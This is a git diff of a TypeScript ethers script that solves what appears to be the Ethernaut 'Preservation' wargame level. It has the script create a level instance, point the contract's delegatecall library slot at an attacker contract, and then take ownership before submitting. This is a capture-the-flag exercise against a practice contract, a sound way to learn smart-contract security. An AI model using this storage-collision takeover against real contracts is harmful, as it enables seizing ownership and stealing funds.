@@ -4,16 +4,17 @@ import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
 import { Preservation__factory } from "../typechain/ethers-v5";
 import { PreservationAttacker__factory } from "../typechain";
+import { createLevel, submitLevel } from './utils';
 
 async function main() {
-  const instanceAddress = "0x07225EaBC5730c781c7FAbe8B29D83D58Ef32A58";
   const signer = getSigner();
-  const target = Preservation__factory.connect(instanceAddress, signer);
+  const level = await createLevel(signer,"preservation");
+  const target = Preservation__factory.connect(level, signer);
   await target.deployed();
 
-  const ownerAddress = await signer.getAddress();
+  const signerAddress = await signer.getAddress();
   console.log("target owner:", await target.owner());
-  console.log("ownerAddress:", ownerAddress);
+  console.log("ownerAddress:", signerAddress);
   console.log("current lib 1:", await target.timeZone1Library());
   console.log("current lib 2:", await target.timeZone2Library());
   
@@ -24,17 +25,22 @@ async function main() {
   console.log("attack data:", BigNumber.from(attacker.address));
 
   // I do not know why call second function not work. But call first function work.
-  await (await target.setSecondTime(BigNumber.from(attacker.address))).wait();
-  // await (await target.setFirstTime(BigNumber.from(attacker.address))).wait();
+  // It is possible first library is real lib same as the example.
+  // While the second lib is very different one
+  //await (await target.setSecondTime(BigNumber.from(attacker.address))).wait();
+  await (await target.setFirstTime(BigNumber.from(attacker.address))).wait();
 
   console.log("current lib 1:", await target.timeZone1Library());
   console.log("current lib 2:", await target.timeZone2Library());
 
   console.log("attack again to give new owner");
-  console.log(BigNumber.from(ownerAddress));
-  await (await target.setFirstTime(BigNumber.from(ownerAddress))).wait();
+  console.log(BigNumber.from(signerAddress));
+  
+  // this actually run out of gas and fail lol? Delegation gaslimit estimate suck.
+  await (await target.setFirstTime(BigNumber.from(signerAddress), {gasLimit:500000})).wait();
+  console.log("new owner:", await target.owner());
 
-  console.log("owner:", await target.owner());
+  await submitLevel(signer,level);
 }
 
 main()
